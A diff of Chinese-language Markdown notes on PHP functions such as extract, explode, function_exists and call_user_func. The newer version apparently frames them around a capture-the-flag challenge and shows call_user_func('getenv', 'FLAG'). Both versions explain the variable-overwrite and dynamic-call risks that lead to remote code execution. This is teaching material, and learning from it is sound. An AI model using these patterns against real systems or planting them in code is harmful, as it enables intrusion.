-   array_merge(['a'=>['x'=>1]], ['a'=>['y'=>2]]);
-   // ['a'=>['y'=>2]]  ⚠️ 内层 x 丢了
-   ```
-
-   要递归合并用 **`array_merge_recursive`**（但同名标量会变成数组，常不符合预期），或用 `array_replace_recursive`。
-
-5. **性能**：一次传多个数组比多次调用高效；大数据量注意内存（返回新数组）
-
-6. **不改变原数组**，返回新数组
-
-7. 别和 `array_combine`（键值配对）混淆——名字像但功能完全不同
-
-
-
-
-
-`explode` — 按分隔符把字符串切成数组
-
-**作用**：把字符串按指定分隔符拆成数组
+`extract()` 用于将关联数组中的键值对转换为当前作用域中的变量
 
 ```php
-$t = "name=zigyr";
-$arr = explode('=', $t);
-// ['name', 'zigyr']
-
-// 限制最多切成 2 段（值里还有 = 时很有用）
-$t2 = "url=http://a.com/?x=1&y=2";
-var_dump(explode('=', $t2, 2));
-// ['url', 'http://a.com/?x=1&y=2']  ✅ 只在第一个 = 处切
-```
-
-**⚠️ 注意事项**
-
-- 分隔符**不能是空字符串** `''`：PHP 8 抛 `ValueError`，PHP 7 返回 `false`。
-- **不限制段数**时，值里含分隔符会被切碎，所以解析 `key=value` 建议用 `explode('=', $t, 2)`。
-- 分隔符不在字符串里 → 返回**只有一个元素的数组** `[$t]`，不会返回 `false`。
-- 反向操作：`implode('=', $arr)`。
-
----
-
-`substr` + `strpos` — 手动截取 `key=value`
-
-你贴的代码就是典型的手动解析：
-
-```php
-$t = "version=2.0";
-
-$var = substr($t, 0, strpos($t, '='));       // 从 0 截到 '=' 前 → "version"
-$val = substr($t, strpos($t, '=') + 1);      // 从 '=' 后一位截到末尾 → "2.0"
-```
-
-拆开看：
-- `strpos($t, '=')` 返回 `=` 的位置，这里是 **7**。
-- `substr($t, 0, 7)` → 取索引 0~6 → `"version"`。
-- `substr($t, 7 + 1)` → 从索引 8 截到结尾 → `"2.0"`。
-
-**⚠️ 注意事项（这段代码的隐藏 bug）**
-- 如果 `$t` 中**没有 `=`**：`strpos` 返回 `false`，`false + 1` 在 PHP 里当 `0 + 1 = 1`，`substr($t, 1)` 会截出错误结果，不报错但逻辑全错。**必须先判断**：
-  ```php
-  if (($pos = strpos($t, '=')) === false) {
-      // 格式不对，跳过
-  }
-  ```
-- `strpos` 返回值可能是 `0`（`=` 在开头，如 `"=abc"`），用 `=== false` 判断，别用 `!$pos`。
-- 值里含多个 `=` 时，`substr(..., $pos + 1)` 能正确保留后面的 `=`（比不限制的 `explode` 更稳）。
-- 中文字符串用 `mb_substr` + `mb_strpos`。
-
-> 💡 其实 `explode('=', $t, 2)` 更简洁安全，这个手动写法是历史/老代码常见风格。
-
----
-
-`extract` — 把数组的键变成变量名
-
-**作用**：把关联数组展开成当前作用域的变量。
-
-```php
-$data = ['name' => 'zigyr', 'img' => 'default.jpg', 'version' => '2.0'];
+$data = [
+    'name' => 'zigyr',
+    'space' => 'admin'
+];
 
 extract($data);
 
-echo $name;     // zigyr
-echo $img;      // default.jpg
-echo $version;  // 2.0
+echo $name;  // zigyr
+echo $space; // admin
 ```
 
-返回值是**成功创建的变量个数**（这里是 `3`）。
+默认使用 `EXTR_OVERWRITE`，当变量名发生冲突时，会覆盖已有变量
 
-**⚠️ 注意事项（这是安全重灾区）**
-- **默认是 `EXTR_OVERWRITE`**：如果已有同名变量会被**覆盖**。比如你前面有 `$version`、`$var`，`extract` 后可能被改掉，导致逻辑被劫持。
-- **绝不能 `extract($_GET)` / `extract($_POST)`**：攻击者传 `?name=xxx&var=yyy` 就能覆盖你的变量，是经典漏洞（变量覆盖 → 逻辑绕过 / RCE）。
-- 可以用第二个参数控制策略：
-  ```php
-  extract($data, EXTR_SKIP);        // 已存在则不覆盖
-  extract($data, EXTR_PREFIX_ALL, 'p'); // 加前缀：$p_name, $p_img
-  ```
-- 键名非法（如含 `-`、数字开头）会**跳过**不创建。
-- 只作用于**当前作用域**，在函数里 `extract` 出来的是局部变量。
+因此，不应直接对用户可控的 `$_GET`、`$_POST` 或其派生数组使用默认的 `extract()`
 
----
+### 5.3 explode()
 
-`function_exists` — 判断某函数是否已定义
-
-**作用**：检查一个**函数名字符串**是否已定义（内置或用户定义）。
+`explode()` 按指定分隔符拆分字符串：
 
 ```php
-var_dump(function_exists('strpos'));      // true  内置
-var_dump(function_exists('my_func'));     // false 未定义
-var_dump(function_exists('strpos(x)'));   // false ❌ 只认函数名，不认调用表达式
+$str = 'action=list module=user';
+
+$result = explode(' ', $str);
 ```
 
-**⚠️ 注意事项**
-- 参数**必须是函数名字符串**，不能是调用表达式（前面讲过）。
-- 只管**全局函数**，不管类方法。判断类方法用 `method_exists($obj, 'm')` 或 `is_callable`。
-- **不是安全边界**：`function_exists('system')` 返回 `true`！所以"`function_exists` 通过才调用"根本挡不住危险函数。做白名单要维护**允许列表**，而不是用 `function_exists`。
-
----
-
-`call_user_func` — 调用一个可调用体
-
-**作用**：用**逐个参数**的方式调用函数/方法/闭包。
+结果：
 
 ```php
-function add($a, $b) { return $a + $b; }
-
-// 普通函数
-echo call_user_func('add', 1, 2);   // 3
-
-// 闭包
-$f = fn($x) => $x * 2;
-echo call_user_func($f, 5);         // 10
-
-// 类静态方法（数组形式）
-echo call_user_func(['MyClass', 'method'], $arg);
-
-// 对象方法
-echo call_user_func([$obj, 'method'], $arg);
+[
+    0 => 'action=list',
+    1 => 'module=user'
+]
 ```
 
-**⚠️ 注意事项**
-- 第一个参数必须是**可调用体**（函数名 / 闭包 / `[类名或对象, 方法]`），否则返回 `false`（旧版）或抛 `TypeError`。
-- **传引用会失败**：`call_user_func('f', $var)` 里的 `$var` 不会按引用传给参数为 `&$x` 的函数，要用 `call_user_func_array` 且数组元素为引用。
-- 性能比直接调用略低（多一层间接）。
-- **安全**：如果第一个参数**用户可控**，等于任意函数调用 → 高危。必须白名单。
+本题中，`explode(' ', $_params)` 决定了参数的拆分边界，因此空格的位置直接影响后续参数解析
 
----
+### 5.4 substr() 与 strpos()
 
-`call_user_func_array` — 用数组作参数列表调用
-
-**作用**：和 `call_user_func` 一样，但**参数打包成数组**传。
+`strpos()` 用于查找子字符串首次出现的位置，`substr()` 用于截取字符串
 
 ```php
-function add($a, $b) { return $a + $b; }
+$t = 'name=getenv';
 
-$args = [1, 2];
-echo call_user_func_array('add', $args);   // 3
-
-// 参数个数不定时特别方便
-function sum(...$n) { return array_sum($n); }
-echo call_user_func_array('sum', [1,2,3,4]); // 10
-
-// 配合类方法
-class C { public function m($x, $y){ return $x.$y; } }
-echo call_user_func_array([new C, 'm'], ['a','b']); // ab
+$var = substr($t, 0, strpos($t, '='));
+$val = substr($t, strpos($t, '=') + 1);
 ```
 
-**⚠️ 注意事项**
-- 第二个参数**必须是数组**（PHP 8 要求，否则 `TypeError`）。
-- 数组的**键名会被忽略**？——不，PHP 8 起如果键名是字符串，会被当作**命名参数**处理，可能报错。用**索引数组**最稳。
-- 同样**不支持按引用传参**（除非数组元素本身是引用）。
-- **安全同上**：`call_user_func_array($fn, $args)` 如果 `$fn`、`$args` 都可控，就是标准 RCE 套路（一句话木马常用）
+最终得到：
 
+```php
+$var = 'name';
+$val = 'getenv';
+```
+
+本题通过这两个函数将每个 `key=value` 字符串拆分为键和值
+
+### 5.5 function_exists()
+
+`function_exists()` 用于检查指定函数是否已经定义
+
+```php
+var_dump(function_exists('getenv'));       // true
+var_dump(function_exists('not_exists'));  // false
+var_dump(function_exists('getenv(FLAG)')); // false
+```
+
+需要注意，`function_exists()` 只检查函数是否存在，并不代表该函数可以安全调用
+
+另外，PHP 8.0 起，`disable_functions` 禁用的函数会从函数表中移除，因此 `function_exists()` 对禁用函数的检查结果与 PHP 7.x 存在差异
+
+### 5.6 call_user_func() 与 call_user_func_array()
+
+`call_user_func()` 用于动态调用指定函数：
+
+```php
+call_user_func('getenv', 'FLAG');
+```
+
+相当于：
+
+```php
+getenv('FLAG');
+```
+
+`call_user_func_array()` 则通过数组传递参数：
+
+```php
+$args = ['FLAG'];
+
+call_user_func_array('getenv', $args);
+```
+
+相当于：
+
+```php
+getenv('FLAG');
+```
+
+两者的主要区别在于参数传递形式：
+
+| 函数 | 参数传递形式 |
+| :--- | :--- |
+| `call_user_func()` | 逐个传入参数 |
+| `call_user_func_array()` | 通过数组传入参数 |
+
+当函数名和参数数组均可被外部输入控制时，需要重点关注动态函数调用带来的安全风险
